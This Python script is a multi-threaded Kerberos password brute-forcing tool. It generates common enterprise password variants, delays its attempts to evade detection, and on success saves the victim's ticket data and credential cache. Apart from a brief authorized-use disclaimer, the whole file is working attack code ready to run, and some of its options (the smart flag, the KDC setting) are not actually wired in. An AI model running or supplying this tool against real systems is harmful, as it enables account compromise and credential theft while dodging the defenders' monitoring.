#!/usr/bin/env python3
"""
Advanced Kerberos Brute Force Attack Script
Features:
- Multi-threaded brute forcing
- Smart password generation
- Rate limiting to avoid detection
- Progress tracking
- Result logging with timestamps
- Automatic ticket extraction on success
"""

import subprocess
import threading
import queue
import time
import argparse
import json
from datetime import datetime
from pathlib import Path
from typing import List, Dict, Optional
import os
from colorama import Fore, Style, init

init(autoreset=True)

class KerberosBruteForce:
    def __init__(
        self,
        realm: str,
        kdc: str,
        username: str,
        password_file: str,
        threads: int = 4,
        delay: float = 1.0,
        output_dir: str = "bruteforce_results"
    ):
        self.realm = realm.upper()
        self.kdc = kdc
        self.username = username
        self.password_file = password_file
        self.threads = threads
        self.delay = delay
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(exist_ok=True)
        
        self.password_queue = queue.Queue()
        self.results = []
        self.success = False
        self.lock = threading.Lock()
        self.attempts = 0
        self.start_time = None
        
        # Statistics
        self.stats = {
            'total_attempts': 0,
            'failed_attempts': 0,
            'successful_attempts': 0,
            'errors': 0,
            'start_time': None,
            'end_time': None
        }
    
    def load_passwords(self) -> List[str]:
        """Load passwords from file"""
        try:
            with open(self.password_file, 'r', encoding='utf-8', errors='ignore') as f:
                passwords = [line.strip() for line in f if line.strip()]
            print(f"{Fore.GREEN}[+] Loaded {len(passwords)} passwords")
            return passwords
        except FileNotFoundError:
            print(f"{Fore.RED}[!] Password file not found: {self.password_file}")
            return []
    
    def generate_smart_passwords(self, base_passwords: List[str]) -> List[str]:
        """
        Generate smart password variations
        Common enterprise password patterns
        """
        variations = []
        current_year = datetime.now().year
        seasons = ['Spring', 'Summer', 'Fall', 'Winter']
        months = ['January', 'February', 'March', 'April', 'May', 'June',
                 'July', 'August', 'September', 'October', 'November', 'December']
        
        for password in base_passwords:
            variations.append(password)
            
            # Add year variations
            for year in range(current_year - 2, current_year + 1):
                variations.append(f"{password}{year}")
                variations.append(f"{password}{str(year)[2:]}")
            
            # Season + Year
            for season in seasons:
                variations.append(f"{season}{current_year}")
                variations.append(f"{season}{str(current_year)[2:]}")
            
            # Month + Year
            for month in months[:3]:  # Limit to recent months
                variations.append(f"{month}{current_year}")
            
            # Common suffixes
            for suffix in ['!', '@', '#', '123', '1', '2024', '2025']:
                variations.append(f"{password}{suffix}")
            
            # Capitalize first letter
            variations.append(password.capitalize())
            
            # All uppercase
            variations.append(password.upper())
        
        return list(set(variations))  # Remove duplicates
    
    def attempt_auth(self, password: str) -> Dict:
        """Attempt Kerberos authentication"""
        principal = f"{self.username}@{self.realm}"
        
        try:
            # Use kinit for authentication
            result = subprocess.run(
                ['kinit', principal],
                input=password.encode(),
                capture_output=True,
                timeout=10,
                env={**os.environ, 'KRB5_CONFIG': '/etc/krb5.conf'}
            )
            
            with self.lock:
                self.attempts += 1
            
            if result.returncode == 0:
                return {
                    'success': True,
                    'username': self.username,
                    'password': password,
                    'principal': principal,
                    'timestamp': datetime.now().isoformat(),
                    'attempts': self.attempts
                }
            else:
                error_msg = result.stderr.decode('utf-8', errors='ignore')
                return {
                    'success': False,
                    'username': self.username,
                    'password': password,
                    'error': error_msg[:100],
                    'timestamp': datetime.now().isoformat()
                }
                
        except subprocess.TimeoutExpired:
            return {
                'success': False,
                'username': self.username,
                'password': password,
                'error': 'Timeout',
                'timestamp': datetime.now().isoformat()
            }
        except Exception as e:
            return {
                'success': False,
                'username': self.username,
                'password': password,
                'error': str(e),
                'timestamp': datetime.now().isoformat()
            }
    
    def worker(self, worker_id: int):
        """Worker thread for brute forcing"""
        while not self.success:
            try:
                password = self.password_queue.get(timeout=1)
            except queue.Empty:
                break
            
            result = self.attempt_auth(password)
            
            with self.lock:
                self.results.append(result)
                
                if result['success']:
                    self.success = True
                    self.stats['successful_attempts'] += 1
                    print(f"\n{Fore.GREEN}{'='*60}")
                    print(f"{Fore.GREEN}[+] SUCCESS!")
                    print(f"{Fore.GREEN}[+] Username: {result['username']}")
                    print(f"{Fore.GREEN}[+] Password: {result['password']}")
                    print(f"{Fore.GREEN}[+] Attempts: {result['attempts']}")
                    print(f"{Fore.GREEN}{'='*60}\n")
                    
                    # Extract ticket
                    self.extract_ticket()
                else:
                    self.stats['failed_attempts'] += 1
                    if self.attempts % 10 == 0:
                        elapsed = time.time() - self.start_time
                        rate = self.attempts / elapsed if elapsed > 0 else 0
                        print(f"{Fore.YELLOW}[{worker_id}] Attempt {self.attempts} | "
                              f"Rate: {rate:.2f}/s | Password: {password[:20]}")
            
            self.password_queue.task_done()
            
            # Rate limiting
            time.sleep(self.delay)
    
    def extract_ticket(self):
        """Extract Kerberos ticket after successful authentication"""
        try:
            result = subprocess.run(['klist'], capture_output=True, text=True)
            
            ticket_file = self.output_dir / f"ticket_{self.username}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
            with open(ticket_file, 'w') as f:
                f.write(result.stdout)
            
            print(f"{Fore.GREEN}[+] Ticket information saved to: {ticket_file}")
            
            # Try to extract credential cache
            ccache = os.environ.get('KRB5CCNAME', f'/tmp/krb5cc_{os.getuid()}')
            if Path(ccache).exists():
                ccache_backup = self.output_dir / f"krb5cc_{self.username}_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
                subprocess.run(['cp', ccache, str(ccache_backup)])
                print(f"{Fore.GREEN}[+] Credential cache saved to: {ccache_backup}")
                
        except Exception as e:
            print(f"{Fore.RED}[!] Error extracting ticket: {e}")
    
    def save_results(self):
        """Save results to JSON file"""
        self.stats['end_time'] = datetime.now().isoformat()
        self.stats['total_attempts'] = self.attempts
        self.stats['duration_seconds'] = (datetime.fromisoformat(self.stats['end_time']) - 
                                          datetime.fromisoformat(self.stats['start_time'])).total_seconds()
        
        output_file = self.output_dir / f"bruteforce_{self.username}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        
        data = {
            'target': {
                'username': self.username,
                'realm': self.realm,
                'kdc': self.kdc
            },
            'config': {
                'threads': self.threads,
                'delay': self.delay,
                'password_file': self.password_file
            },
            'statistics': self.stats,
            'results': self.results[:100]  # Save last 100 attempts
        }
        
        with open(output_file, 'w') as f:
            json.dump(data, f, indent=2)
        
        print(f"\n{Fore.CYAN}[*] Results saved to: {output_file}")
    
    def run(self):
        """Run brute force attack"""
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"{Fore.CYAN}Kerberos Brute Force Attack")
        print(f"{Fore.CYAN}{'='*60}")
        print(f"{Fore.CYAN}Target: {self.username}@{self.realm}")
        print(f"{Fore.CYAN}KDC: {self.kdc}")
        print(f"{Fore.CYAN}Threads: {self.threads}")
        print(f"{Fore.CYAN}Delay: {self.delay}s")
        print(f"{Fore.CYAN}{'='*60}\n")
        
        # Load passwords
        base_passwords = self.load_passwords()
        if not base_passwords:
            return
        
        # Generate smart variations
        print(f"{Fore.YELLOW}[*] Generating password variations...")
        passwords = self.generate_smart_passwords(base_passwords)
        print(f"{Fore.GREEN}[+] Total passwords to test: {len(passwords)}")
        
        # Queue passwords
        for password in passwords:
            self.password_queue.put(password)
        
        # Start timing
        self.start_time = time.time()
        self.stats['start_time'] = datetime.now().isoformat()
        
        # Start workers
        print(f"{Fore.YELLOW}[*] Starting {self.threads} worker threads...")
        threads = []
        for i in range(self.threads):
            t = threading.Thread(target=self.worker, args=(i,))
            t.start()
            threads.append(t)
        
        # Wait for completion
        for t in threads:
            t.join()
        
        # Save results
        self.save_results()
        
        # Print summary
        elapsed = time.time() - self.start_time
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"{Fore.CYAN}Summary:")
        print(f"{Fore.CYAN}{'='*60}")
        print(f"Total attempts: {self.attempts}")
        print(f"Duration: {elapsed:.2f}s")
        print(f"Rate: {self.attempts/elapsed:.2f} attempts/second")
        print(f"Success: {Fore.GREEN if self.success else Fore.RED}{self.success}")
        print(f"{Fore.CYAN}{'='*60}\n")


def main():
    parser = argparse.ArgumentParser(
        description="Advanced Kerberos Brute Force Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Basic brute force
  python kerb_bruteforce_advanced.py -r LAB.LOCAL -k 192.168.88.20 -u admin -p passwords.txt
  
  # Multi-threaded with custom delay
  python kerb_bruteforce_advanced.py -r LAB.LOCAL -k 192.168.88.20 -u admin -p passwords.txt -t 8 -d 0.5
  
  # With smart password generation
  python kerb_bruteforce_advanced.py -r LAB.LOCAL -k 192.168.88.20 -u admin -p base_passwords.txt --smart

⚠️  Use only in authorized environments!
        """
    )
    
    parser.add_argument('-r', '--realm', required=True, help='Kerberos realm (e.g., LAB.LOCAL)')
    parser.add_argument('-k', '--kdc', required=True, help='KDC IP address')
    parser.add_argument('-u', '--username', required=True, help='Target username')
    parser.add_argument('-p', '--password-file', required=True, help='Password file path')
    parser.add_argument('-t', '--threads', type=int, default=4, help='Number of threads (default: 4)')
    parser.add_argument('-d', '--delay', type=float, default=1.0, help='Delay between attempts (default: 1.0s)')
    parser.add_argument('-o', '--output-dir', default='bruteforce_results', help='Output directory')
    parser.add_argument('--smart', action='store_true', help='Generate smart password variations')
    
    args = parser.parse_args()
    
    bruteforcer = KerberosBruteForce(
        realm=args.realm,
        kdc=args.kdc,
        username=args.username,
        password_file=args.password_file,
        threads=args.threads,
        delay=args.delay,
        output_dir=args.output_dir
    )
    
    bruteforcer.run()


if __name__ == "__main__":
    main()
    